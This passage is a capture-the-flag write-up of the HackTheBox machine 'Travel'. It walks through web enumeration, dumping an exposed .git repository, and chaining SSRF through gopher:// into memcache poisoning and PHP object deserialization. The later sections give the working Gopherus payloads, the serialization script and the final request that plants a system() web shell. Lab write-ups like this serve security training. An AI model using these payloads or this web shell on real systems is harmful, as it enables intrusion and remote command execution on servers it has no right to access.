---
title: Travel HackTheBox writeup made by a dumb !!!
author: dumbx90
date: 2020-09-16 14:10:00 +0800
categories: [HTB, Writeup]
tags: [htb,hard,retired,linux,memcahe,PHP Serialization]
---









## Summary 

Travel  is a hard machine. Using ffuf I found the .git folder and downloaded with **git-dumper.py** . Read the source code of the applications I found a entry point, but I have to learn a lot to understanding this. The application use memcache with serialized objects in **Php**. After a lot of try and errors, I'm able to achieve a **RCE** that give me a initial shell in the machine. Lookup for creds, I found one **LDAP HASH**, cracked and use this credentials to give a root access, because the user is the **LDAP Administrator** and I abuse this feature to get a root shell.  



## Skills Necessary  

- Recon

- Web Enumeration

- Basic knowledge how user Burp Suite

- LDAP

- Memcache


## Skills Learned

- SSRF
- PHP Serialization
- Memcache
- LDAP Attibutes




## Recon 

Start with simple nmap to discovery what services is running in the box:

```bash
nmap-recon 10.10.10.189
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-16 11:30 EDT
Nmap scan report for 10.10.10.189
Host is up (0.15s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http     nginx 1.17.6
|_http-server-header: nginx/1.17.6
|_http-title: Travel.HTB
443/tcp open  ssl/http nginx 1.17.6
|_http-server-header: nginx/1.17.6
|_http-title: Travel.HTB - SSL coming soon.
| ssl-cert: Subject: commonName=www.travel.htb/organizationName=Travel.HTB/countryName=UK
| Subject Alternative Name: DNS:www.travel.htb, DNS:blog.travel.htb, DNS:blog-dev.travel.htb
| Not valid before: 2020-04-23T19:24:29
|_Not valid after:  2030-04-21T19:24:29
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.81 seconds
```

In the nmap we found three virtual hosts, so lets change the file */etc/hosts* and add this virtual hosts:

```bash
bat /etc/hosts
───────┬──────────────────────────────────────────────────────────────────────────────
       │ File: /etc/hosts
───────┼──────────────────────────────────────────────────────────────────────────────
   1   │ 127.0.0.1   localhost
   2   │ 127.0.1.1   kali
   3   │ 10.10.10.189    www.travel.htb blog.travel.htb blog-dev.travel.htb
   4   │ # The following lines are desirable for IPv6 capable hosts
   5   │ ::1     localhost ip6-localhost ip6-loopback
   6   │ ff02::1 ip6-allnodes
   7   │ ff02::2 ip6-allrouters
───────┴──────────────────────────────────────────────────────────────────────────────
```



###  Enumeration of virtual hosts

The **nmap**  scan give more two vrtual hosts plus what I alread know :

- www.travel.htb
- blog.travel.htb
- blog-dev.travel.htb

Let me see how this hosts looks like:

<img src="/home/pwndumb/Documents/cyber-notes/dumbx90.github.io/assets/img/commons/hackthebox/travel/blog-travel.png" style="zoom:75%;" />

![](/home/pwndumb/Documents/cyber-notes/dumbx90.github.io/assets/img/commons/hackthebox/travel/blog-dev-travel.png)



### wpscan 

Afer analuse the source code of **blog.htb.travel**  I realize that site is a **Wordpress CMS**. Running *wpscan* for check if website is running any vulnerable plugins:

```bash
$ wpscan --url http://blog.travel.htb --enumerate
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.7

       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] Updating the Database ...
[i] Update completed.

[+] URL: http://blog.travel.htb/ [10.10.10.189]
[+] Started: Wed Sep 16 17:41:43 2020

Interesting Finding(s):

[+] Headers
 | Interesting Entries:
 |  - Server: nginx/1.17.6
 |  - X-Powered-By: PHP/7.3.16
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] robots.txt found: http://blog.travel.htb/robots.txt
 | Interesting Entries:
 |  - /wp-admin/
 |  - /wp-admin/admin-ajax.php
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://blog.travel.htb/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

[+] WordPress readme found: http://blog.travel.htb/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://blog.travel.htb/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.4 identified (Insecure, released on 2020-03-31).
 | Found By: Rss Generator (Passive Detection)
 |  - http://blog.travel.htb/feed/, <generator>https://wordpress.org/?v=5.4</generator>
 |  - http://blog.travel.htb/comments/feed/, <generator>https://wordpress.org/?v=5.4</generator>

[+] WordPress theme in use: twentytwenty
 | Location: http://blog.travel.htb/wp-content/themes/twentytwenty/
 | Last Updated: 2020-08-11T00:00:00.000Z
 | Readme: http://blog.travel.htb/wp-content/themes/twentytwenty/readme.txt
 | [!] The version is out of date, the latest version is 1.5
 | Style URL: http://blog.travel.htb/wp-content/themes/twentytwenty/style.css?ver=1.2
 | Style Name: Twenty Twenty
 | Style URI: https://wordpress.org/themes/twentytwenty/
 | Description: Our default theme for 2020 is designed to take full advantage of the flexibility of the block editor...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 | Confirmed By: Css Style In 404 Page (Passive Detection)
 |
 | Version: 1.2 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://blog.travel.htb/wp-content/themes/twentytwenty/style.css?ver=1.2, Match: 'Version: 1.2'

[+] Enumerating Vulnerable Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Vulnerable Themes (via Passive and Aggressive Methods)
 Checking Known Locations - Time: 00:00:12 <============================================================================================> (346 / 346) 100.00% Time: 00:00:12
[+] Checking Theme Versions (via Passive and Aggressive Methods)

[i] No themes Found.

[+] Enumerating Timthumbs (via Passive and Aggressive Methods)
 Checking Known Locations - Time: 00:01:35 <==========================================================================================> (2575 / 2575) 100.00% Time: 00:01:35

[i] No Timthumbs Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:01 <===============================================================================================> (21 / 21) 100.00% Time: 00:00:01

[i] No Config Backups Found.

[+] Enumerating DB Exports (via Passive and Aggressive Methods)
 Checking DB Exports - Time: 00:00:01 <===================================================================================================> (36 / 36) 100.00% Time: 00:00:01

[i] No DB Exports Found.

[+] Enumerating Medias (via Passive and Aggressive Methods) (Permalink setting must be set to "Plain" for those to be detected)
 Brute Forcing Attachment IDs - Time: 00:00:04 <========================================================================================> (100 / 100) 100.00% Time: 00:00:04

[i] No Medias Found.

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:01 <==============================================================================================> (10 / 10) 100.00% Time: 00:00:01

[i] User(s) Identified:

[+] admin
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://blog.travel.htb/wp-json/wp/v2/users/?per_page=100&page=1
 |  Rss Generator (Aggressive Detection)
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[!] No WPVulnDB API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up

[+] Finished: Wed Sep 16 17:43:50 2020
[+] Requests Done: 3143
[+] Cached Requests: 10
[+] Data Sent: 798.768 KB
[+] Data Received: 16.687 MB
[+] Memory used: 233.871 MB
[+] Elapsed time: 00:02:06

```

This scan not give anithing interesting. 

### Awesome RSS

![](www.dumbx90.github.io/assets/img/commons/hackthebox/travel/awesome-rss.png)

![](www.dumbx90.github.io/assets/img/commons/hackthebox/travel/awesome-rss-post.png)



The first post of blog tell about a new feature - ***RSS***. View the source code I found this:

```html
<title>Awesome RSS &#8211; Travel Blog</title>
<link rel='dns-prefetch' href='//s.w.org' />
<link rel="alternate" type="application/rss+xml" title="Travel Blog &raquo; Feed" href="http://blog.travel.htb/feed/" />
<link rel="alternate" type="application/rss+xml" title="Travel Blog &raquo; Comments Feed" href="http://blog.travel.htb/comments/feed/" />
		<script>

<SNIP>
link rel="alternate" type="text/xml+oembed" href="http://blog.travel.htb/wp-json/oembed/1.0/embed?url=http%3A%2F%2Fblog.travel.htb%2Fawesome-rss%2F&#038;format=xml" />
	<script>document.documentElement.className = document.documentElement.className.replace( 'no-js', 'js' );</script>
	<style>.recentcomments a{display:inline !important;padding:0 !important;margin:0 !important;}</style>		<style id="wp-custom-css">
			/* I am really not sure how to include a custom CSS file
 * in worpress. I am including it directly via Additional CSS for now.
 * TODO: Fixme when copying from -dev to -prod. */

@import url(http://blog-dev.travel.htb/wp-content/uploads/2020/04/custom-css-version#01.css);		</style>
<SNIP>
<!--
DEBUG
-->
```

Two thing came to my eyes: 

1. The import is linked to **blog-dev.travel.htb**
2. The **DEBUG** word. 

I dont realize what this **DEBUG**, so I move on and try a directory brute force in **blog-devel.travel.htb**. 

## ffuf 



```bash
ffuf -u http://blog-dev.travel.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.0.2
________________________________________________

 :: Method           : GET
 :: URL              : http://blog-dev.travel.htb/FUZZ
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
________________________________________________

.                       [Status: 403, Size: 154, Words: 3, Lines: 8]
.git                    [Status: 301, Size: 170, Words: 5, Lines: 8]
```

So I found the **.git** directory. This can have some sensitive information or if I was look, the source code of the website.

## HTTP Code Analysis 

### git-dumper

Using ***git-dumper*** I am able to recovery **git folder** : 

```bash
~/Tools/git-dumper/git-dumper.py http://blog-dev.travel.htb dev-git
[-] Testing http://blog-dev.travel.htb/.git/HEAD [200]
[-] Testing http://blog-dev.travel.htb/.git/ [403]
[-] Fetching common files
[-] Fetching http://blog-dev.travel.htb/.gitignore [404]
[-] Fetching http://blog-dev.travel.htb/.git/COMMIT_EDITMSG [200]
[-] Fetching http://blog-dev.travel.htb/.git/hooks/applypatch-msg.sample [200]
[-] Fetching http://blog-dev.travel.htb/.git/hooks/post-commit.sample [404]
[-] Fetching http://blog-dev.travel.htb/.git/description [200]
[-] Fetching http://blog-dev.travel.htb/.git/hooks/post-receive.sample [404]
[-] Fetching http://blog-dev.travel.htb/.git/hooks/commit-msg.sample [200]
[-] Fetching http://blog-dev.travel.htb/.git/hooks/post-update.sample [200]
[-] Fetching http://blog-dev.travel.htb/.git/hooks/pre-applypatch.sample [200]
[-] Fetching http://blog-dev.travel.htb/.git/hooks/pre-commit.sample [200]
[-] Fetching http://blog-dev.travel.htb/.git/hooks/pre-rebase.sample [200]
[-] Fetching http://blog-dev.travel.htb/.git/hooks/pre-receive.sample [200]
[-] Fetching http://blog-dev.travel.htb/.git/index [200]
[-] Fetching http://blog-dev.travel.htb/.git/info/exclude [200]
[-] Fetching http://blog-dev.travel.htb/.git/objects/info/packs [404]
[-] Fetching http://blog-dev.travel.htb/.git/hooks/pre-push.sample [200]
[-] Fetching http://blog-dev.travel.htb/.git/hooks/update.sample [200]
[-] Fetching http://blog-dev.travel.htb/.git/hooks/prepare-commit-msg.sample [200]
[-] Finding refs/
[-] Fetching http://blog-dev.travel.htb/.git/ORIG_HEAD [404]
[-] Fetching http://blog-dev.travel.htb/.git/FETCH_HEAD [404]
[-] Fetching http://blog-dev.travel.htb/.git/config [200]
[-] Fetching http://blog-dev.travel.htb/.git/info/refs [404]
[-] Fetching http://blog-dev.travel.htb/.git/logs/refs/remotes/origin/master [404]
[-] Fetching http://blog-dev.travel.htb/.git/logs/refs/remotes/origin/HEAD [404]
[-] Fetching http://blog-dev.travel.htb/.git/logs/refs/heads/master [200]
[-] Fetching http://blog-dev.travel.htb/.git/logs/HEAD [200]
[-] Fetching http://blog-dev.travel.htb/.git/HEAD [200]
[-] Fetching http://blog-dev.travel.htb/.git/logs/refs/stash [404]
[-] Fetching http://blog-dev.travel.htb/.git/packed-refs [404]
[-] Fetching http://blog-dev.travel.htb/.git/refs/remotes/origin/HEAD [404]
[-] Fetching http://blog-dev.travel.htb/.git/refs/heads/master [200]
[-] Fetching http://blog-dev.travel.htb/.git/refs/remotes/origin/master [404]
[-] Fetching http://blog-dev.travel.htb/.git/refs/stash [404]
[-] Fetching http://blog-dev.travel.htb/.git/refs/wip/wtree/refs/heads/master [404]
[-] Fetching http://blog-dev.travel.htb/.git/refs/wip/index/refs/heads/master [404]
[-] Finding packs
[-] Finding objects
[-] Fetching objects
[-] Fetching http://blog-dev.travel.htb/.git/objects/ed/116c7c7c51645f1e8a403bcec44873f74208e9 [200]
[-] Fetching http://blog-dev.travel.htb/.git/objects/2b/1869f5a2d50f0ede787af91b3ff376efb7b039 [200]
[-] Fetching http://blog-dev.travel.htb/.git/objects/30/b6f36ec80e8bc96451e47c49597fdd64cee2da [200]
[-] Fetching http://blog-dev.travel.htb/.git/objects/00/00000000000000000000000000000000000000 [404]
[-] Fetching http://blog-dev.travel.htb/.git/objects/03/13850ae948d71767aff2cc8cc0f87a0feeef63 [200]
[-] Fetching http://blog-dev.travel.htb/.git/objects/b0/2b083f68102c4d62c49ed3c99ccbb31632ae9f [200]
```

```bash
cat README.md
# Rss Template Extension

Allows rss-feeds to be shown on a custom wordpress page.

## Setup

* `git clone https://github.com/WordPress/WordPress.git`
* copy rss_template.php & template.php to `wp-content/themes/twentytwenty`
* create logs directory in `http://blog.travel.htb/awesome-rss/?debug`
* create page in backend and choose rss_template.php as theme

## Changelog

- temporarily disabled cache compression
- added additional security checks
- added caching
- added rss template

## ToDo

- finish logging implementation 

```

This  tell me the path where is the file **rss_template.php** and the **logs** directory.

### rss_template.php

```php
  1   │ <?php
  2   │ /*
  3   │ Template Name: Awesome RSS
  4   │ */
  5   │ include('template.php');
  6   │ get_header();
  7   │ ?>
  8   │
  9   │ <main class="section-inner">
 10   │     <?php
 11   │     function get_feed($url){
 12   │      require_once ABSPATH . '/wp-includes/class-simplepie.php';
 13   │      $simplepie = null;
 14   │      $data = url_get_contents($url);
 15   │      if ($url) {
 16   │          $simplepie = new SimplePie();
 17   │          $simplepie->set_cache_location('memcache://127.0.0.1:11211/?timeout=60&prefix=xct_');
 18   │          //$simplepie->set_raw_data($data);
 19   │          $simplepie->set_feed_url($url);
 20   │          $simplepie->init();
 21   │          $simplepie->handle_content_type();
 22   │          if ($simplepie->error) {
 23   │              error_log($simplepie->error);
 24   │              $simplepie = null;
 25   │              $failed = True;
 26   │          }
 27   │      } else {
 28   │          $failed = True;
 29   │      }
 30   │      return $simplepie;
 31   │      }
 32   │
 33   │     $url = $_SERVER['QUERY_STRING'];
 34   │     if(strpos($url, "custom_feed_url") !== false){
 35   │         $tmp = (explode("=", $url));
 36   │         $url = end($tmp);
 37   │      } else {
 38   │         $url = "http://www.travel.htb/newsfeed/customfeed.xml";
 39   │      }
 40   │      $feed = get_feed($url);
 41   │      if ($feed->error())
 42   │         {
 43   │             echo '<div class="sp_errors">' . "\r\n";
 44   │             echo '<p>' . htmlspecialchars($feed->error()) . "</p>\r\n";
 45   │             echo '</div>' . "\r\n";
 46   │         }
 47   │         else {
 48   │     ?>
 49   │     <div class="chunk focus">
 50   │         <h3 class="header">
 51   │         <?php
 52   │             $link = $feed->get_link();
 53   │             $title = $feed->get_title();
 54   │             if ($link)
 55   │             {
 56   │                 $title = "<a href='$link' title='$title'>$title</a>";
 57   │             }
 58   │             echo $title;
 59   │         ?>
 60   │         </h3>
 61   │         <?php echo $feed->get_description(); ?>
 62   │
 63   │     </div>
 64   │     <?php foreach($feed->get_items() as $item): ?>
 65   │         <div class="chunk">
 66   │             <h4><?php if ($item->get_permalink()) echo '<a href="' . $item->get_permalink() . '">'; echo $item->get_title(); if ($item->get_permalink()) echo '</a>'; ?>&nbsp;<span class="footnote"><?php echo $item->get_date('j M Y, g:i a'); ?></span></h4>
 67   │             <?php echo $item->get_content(); ?>
 68   │             <?php
 69   │             if ($enclosure = $item->get_enclosure(0))
 70   │             {
 71   │                 echo '<div align="center">';
 72   │                 echo '<p>' . $enclosure->embed(array(
 73   │                     'audio' => './for_the_demo/place_audio.png',
 74   │                     'video' => './for_the_demo/place_video.png',
 75   │                     'mediaplayer' => './for_the_demo/mediaplayer.swf',
 76   │                     'altclass' => 'download'
 77   │                 )) . '</p>';
 78   │                 if ($enclosure->get_link() && $enclosure->get_type())
 79   │                 {
 80   │                     echo '<p class="footnote" align="center">(' . $enclosure->get_type();
 81   │                     if ($enclosure->get_size())
 82   │                     {
 83   │                         echo '; ' . $enclosure->get_size() . ' MB';
 84   │                     }
 85   │                     echo ')</p>';
 86   │                 }
 87   │                 if ($enclosure->get_thumbnail())
 88   │                 {
 89   │                     echo '<div><img src="' . $enclosure->get_thumbnail() . '" alt="" /></div>';
 90   │                 }
 91   │                 echo '</div>';
 92   │             }
 93   │             ?>
 94   │
 95   │         </div>
 96   │     <?php endforeach; ?>
 97   │ <?php } ?>
 98   │ </main>
 99   │
100   │ <!--
101   │ DEBUG
102   │ <?php
103   │ if (isset($_GET['debug'])){
104   │   include('debug.php');
105   │ }
106   │ ?>
107   │ -->
108   │
109   │ <?php get_template_part( 'template-parts/footer-menus-widgets' ); ?>
110   │
111   │ <?php
112   │ get_footer();
```



In the line 5 the script include the file **template.php**. In the line 12 is include the file **class-simplepie.php** that is a plugin for **WordPress** to handle with **RSS feed**.  In the line 11 is created the function **get_feed**, which have as parameter one url. This functions fetch  url contents (line 14) and create a **Simple Pie** object, and use memcache to save feeds. 
In the line 34 the code check for **custom_feed_url** - If this variable exist in **GET**  parameter, the applications gets feed from that parameter otherwise is made a request to  **http://www.travel.htb/newsfeed/customfeed.xml**. 



### template.php

```php
 1|  <?php
 2│
 3│ /**
 4│  Todo: finish logging implementation via TemplateHelper
 5│ */
 6│
 7│ function safe($url)
 8│ {
 9│     // this should be secure
10│     $tmpUrl = urldecode($url);
11│     if(strpos($tmpUrl, "file://") !== false or strpos($tmpUrl, "@") !== false)
12│     {
13│         die("<h2>Hacking attempt prevented (LFI). Event has been logged.</h2>");
14│     }
15│     if(strpos($tmpUrl, "-o") !== false or strpos($tmpUrl, "-F") !== false)
16│     {
17│         die("<h2>Hacking attempt prevented (Command Injection). Event has been logged.</h2>");
18│     }
19│     $tmp = parse_url($url, PHP_URL_HOST);
20│     // preventing all localhost access
21│     if($tmp == "localhost" or $tmp == "127.0.0.1")
22│     {
23│         die("<h2>Hacking attempt prevented (Internal SSRF). Event has been logged.</h2>");
24│     }
25│     return $url;
26│ }
27│
28│ function url_get_contents ($url) {
29│     $url = safe($url);
30│     $url = escapeshellarg($url);
31│     $pl = "curl ".$url;
32│     $output = shell_exec($pl);
33│     return $output;
34│ }
35│
36│
37│ class TemplateHelper
38│ {
39│
40│     private $file;
41│     private $data;
42│
43│     public function __construct(string $file, string $data)
44│     {
45│         $this->init($file, $data);
46│     }
47│
48│     public function __wakeup()
49│     {
50│         $this->init($this->file, $this->data);
51│     }
52│
53│     private function init(string $file, string $data)
54│     {
55│         $this->file = $file;
56│         $this->data = $data;
57│         file_put_contents(__DIR__.'/logs/'.$this->file, $this->data);
58│     }
59│
```



In the line 7 the function **safe($url)** is created with the argument **url** is passed by the user in the **GET** parameter. The lines beteween 11 and 18 are self explicative to prevent **LFI** and **COMMAND INJECTION**.  The line 21 prevent **SSRF**.  The line 28 the funtion **url_get_contents** is created with **url** argument and call the funtion **safe** in the line 29. 



## The Atack Plan 

My goal is atack the memcache service using **SSRF**. For this I have to complete few tasks:

1. Bypass **SSRF** protection;
2. Insert one malicious **php serialization**  object in memcache service; 
3. Exploit memcache **php deserialization** , with *SSRF* to execute the malicious php object

For taks 1, is trivial. Convert *127.0.0.1* to decimal or put more one 0 (zero) in octet is enough. The task 2 is more  dificult and require a few steps that I explain.

#### **customfeed.xml** 

I already know the **http://blog.tarvel.htb/awesome-rss** is using the **rss_tempate.php** and parse the  **http://www.travel.htb/newsfeed/customfeed.xml** for the browser. Lets download  the **customfeed.xml**  and see If we can leverage the **custom_feed_url** parameter:

```bash
curl www.travel.htb/newsfeed/customfeed.xml -O
$ bat customfeed.xml| head
<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:wfw="http://wellformedweb.org/CommentAPI/" xmlns:media="http://search.yahoo.com/mrss/">
<channel>
<item>
<title>Kingdoms In Sri Lanka</title>
<link>http://blog.travel.htb/awesome-rss/</link>
<guid>http://blog.travel.htb/awesome-rss/</guid>
<pubDate>Wed, 26 Feb 2020 09:06:10 -0600</pubDate>
<description><![CDATA[Sri Lankan history dates back to around 35,000 years. Kingdoms in Sri Lanka began from about 6th century BCE. Here's the first of two guides to help you better understand it. Tambapanni (now Mannar) was the first that belonged to the Kingdom of Rajarata from 543-505 BC during the time of Vijaya. Following the rule of King Vijaya, was the Kingdom of Upatissa Nuwara or "Vijithapura" from 505-377 BC. The Prime Minister of Vijaya was the ruler and following his death arrived his nephew, Panduvasdeva. The remaining successors of this kingdom include Upatissa, Panduvasdeva, Abhaya, Tissa and Pandukabhaya.]]></description>
</item>

```



Make one request to *http://blog.travel.htb/awesome-rss/?custom_feed_url=http://10.10.14.21/myfeed.xml*  result in two in my computer, but one request the same xml again is only one request is created: 

<img src="/home/pwndumb/Documents/cyber-notes/dumbx90.github.io/assets/img/commons/hackthebox/travel/reques-custom_feed.png" alt="reques-custom_feed" style="zoom:75%;" />

<img src="/home/pwndumb/Documents/cyber-notes/dumbx90.github.io/assets/img/commons/hackthebox/travel/reques-custom_feed-2.png" alt="reques-custom_feed-2" style="zoom:75%;" />



This behaviour lets me crazy.  After a long time and a few hair less in my head I realized that is because memcache service. So following the hint in the forum I start to lookup the **DEBUG** paramater in the  **rss_template.php**

#### debug 

Reading the source code of **rss_template.php**  I created a request with **debug** parameter like this *http://blog.travel.htb/awesome-rss/?debug* and after examine the source of web page rendered in my browser I can understating whats happened. 

> The memcache is used to cache the feed of rss xml, serialize the php data and creating a key for each xml. The key start with the string *xct_*

<img src="/home/pwndumb/Documents/cyber-notes/dumbx90.github.io/assets/img/commons/hackthebox/travel/debug-render-page.png" alt="debug-render-page" style="zoom:75%;" />

Reading the **README.MD** in the git repository I can found the correct path of **debug.php**: 

	> http://blog.travel.htb/wp-content/themes/twentytwenty/debug.php

<img src="/home/pwndumb/Documents/cyber-notes/dumbx90.github.io/assets/img/commons/hackthebox/travel/debug-burp.png" alt="debug-burp" style="zoom:75%;" />

### Understading the name 

Reading files *https://github.com/WordPress/WordPress/blob/master/wp-includes/SimplePie/Cache/Memcache.php*   I can discovery how the name was created:

> I resume this discovery. After saw  the class called in the rss_tplate.php I downloaded the repository of wrodpress to my local machine.

```php
// L97 Memcache.php 
$this->name = $this->options['extras']['prefix'] . md5("$name:$type");
// type is "spc" 

		$this->cache = new Memcache();
		$this->cache->addServer($this->options['host'], (int) $this->options['port']);
} 
```

$name it the md5 of url and $type is string "spc". Lets check if my assumption is correct:

<img src="/home/pwndumb/Documents/cyber-notes/dumbx90.github.io/assets/img/commons/hackthebox/travel/md5_burp.png" alt="md5_burp" style="zoom:75%;" />

<img src="/home/pwndumb/Documents/cyber-notes/dumbx90.github.io/assets/img/commons/hackthebox/travel/md5_terminal.png" alt="md5_terminal" style="zoom:75%;" />



### Poison memcache object

To do that I have to bypass the *localhost* filter and  user [**gopher**](https://en.wikipedia.org/wiki/Gopher_(protocol)) protocol to access **memcache**.  So I send this request in *Burp repeater*, and nothing happened 

```html
GET /awesome-rss/?custom_feed_url=gopher://0x7f000001:1211/ HTTP/1.1
Host: blog.travel.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1

```



<img src="/home/pwndumb/Documents/cyber-notes/dumbx90.github.io/assets/img/commons/hackthebox/travel/gopher-not-work.png" alt="gopher-not-work" style="zoom:75%;" />

## Puting all together 



### Gopherus

After a lot of research, I found this amazing tool named [Gopherus](https://github.com/tarunkant/Gopherus.git). This tool allowed me to create url using *gopher* protocol to  poison memcache service using *SSRF* vulnerability: 

```bash
./gopherus.py --exploit phpmemcache
  ________              .__
 /  _____/  ____ ______ |  |__   ___________ __ __  ______
/   \  ___ /  _ \\____ \|  |  \_/ __ \_  __ \  |  \/  ___/
\    \_\  (  <_> )  |_> >   Y  \  ___/|  | \/  |  /\___ \
 \______  /\____/|   __/|___|  /\___  >__|  |____//____  >
        \/       |__|        \/     \/                 \/

                author: $_SpyD3r_$

This is usable when you know Class and Variable name used by user

Give serialization payload
example: O:5:"Hello":0:{}   : Test

Your gopher link is ready to do SSRF :

gopher://127.0.0.1:11211/_%0d%0aset%20SpyD3r%204%200%204%0d%0aTest%0d%0a

After everything done, you can delete memcached item by using this payload:

gopher://127.0.0.1:11211/_%0d%0adelete%20SpyD3r%0d%0a

-----------Made-by-SpyD3r-----------
```



I copy the link generate by the tool to *Burp Intruder*, change the *127.0.0.1* to *0x7f00001* and try again:

```php
GET /awesome-rss/?custom_feed_url=gopher://0x7f000001:11211/_%0d%0aset%20SpyD3r%204%200%204%0d%0aTest%0d%0a HTTP/1.1
Host: blog.travel.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
```

<img src="/home/pwndumb/Documents/cyber-notes/dumbx90.github.io/assets/img/commons/hackthebox/travel/poison-memcache.png" alt="poison-memcache" style="zoom:75%;" />



#### Class TemplateHelper

I am able to poison memcache but take me too long to figure out how use that to achieve a rce and reverse shell. After some hints, I  return my attentions to *TemplateHelper* class. This particular class has a function named *init* that write files in *log* directory .  After change this class to meet my desire, it look like this:

```php
<?php

class TemplateHelper
{

    public $file;
    public $data;

    public function __construct(string $file, string $data)
    {
        $this->init($file, $data);
    }


    private function init(string $file, string $data)
    {
        $this->file = $file;
        $this->data = $data;
        file_put_contents(__DIR__.'/logs/'.$this->file, $this->data);
    }
}

$payload = new TemplateHelper("dumbx90.php","<?php system(\$_REQUEST['dumb']); ?>");
echo serialize($payload);
?>
```

I create a directory named *logs* and run the code above:

```bash
php pwn.php
O:14:"TemplateHelper":2:{s:4:"file";s:11:"dumbx90.php";s:4:"data";s:35:"<?php system($_REQUEST['dumb']); ?>";}          

bat logs/dumbx90.php -p
<?php system($_REQUEST['dumb']); ?>
```

Ok, so I copy the serialized object  and put that in *Gopherus* :

```bash
./gopherus.py --exploit phpmemcache


  ________              .__
 /  _____/  ____ ______ |  |__   ___________ __ __  ______
/   \  ___ /  _ \\____ \|  |  \_/ __ \_  __ \  |  \/  ___/
\    \_\  (  <_> )  |_> >   Y  \  ___/|  | \/  |  /\___ \
 \______  /\____/|   __/|___|  /\___  >__|  |____//____  >
        \/       |__|        \/     \/                 \/

                author: $_SpyD3r_$


This is usable when you know Class and Variable name used by user

Give serialization payload
example: O:5:"Hello":0:{}   : O:14:"TemplateHelper":2:{s:4:"file";s:11:"dumbx90.php";s:4:"data";s:35:"<?php system($_REQUEST['dumb']); ?>";}

Your gopher link is ready to do SSRF :

gopher://127.0.0.1:11211/_%0d%0aset%20SpyD3r%204%200%20111%0d%0aO:14:%22TemplateHelper%22:2:%7Bs:4:%22file%22%3Bs:11:%22dumbx90.php%22%3Bs:4:%22data%22%3Bs:35:%22%3C%3Fphp%20system%28%24_REQUEST%5B%27dumb%27%5D%29%3B%20%3F%3E%22%3B%7D%20%0d%0a

After everything done, you can delete memcached item by using this payload:

gopher://127.0.0.1:11211/_%0d%0adelete%20SpyD3r%0d%0a

-----------Made-by-SpyD3r-----------
```

 Copy the output to my *Burp Intruder* change some parameter like hash identifier of serialized object (the hash of ur feedmy.xml) and finally achieve my goal - A tiny but functional web shell. The steps are: 

1. Send the request below 

```php
GET /awesome-rss/?custom_feed_url=gopher://0x7f000001:11211/_%0d%0aset%20xct_4cdb6bff3e2c6550a0fcfe09581b39ad%204%200%20107%0d%0aO:14:%22TemplateHelper%22:2:%7Bs:4:%22file%22%3Bs:8:%22dumb.php%22%3Bs:4:%22data%22%3Bs:35:%22%3C%3Fphp%20system%28%24_REQUEST%5B%27dumb%27%5D%29%3B%20%3F%3E%22%3B%7D%20%0d%0a HTTP/1.1
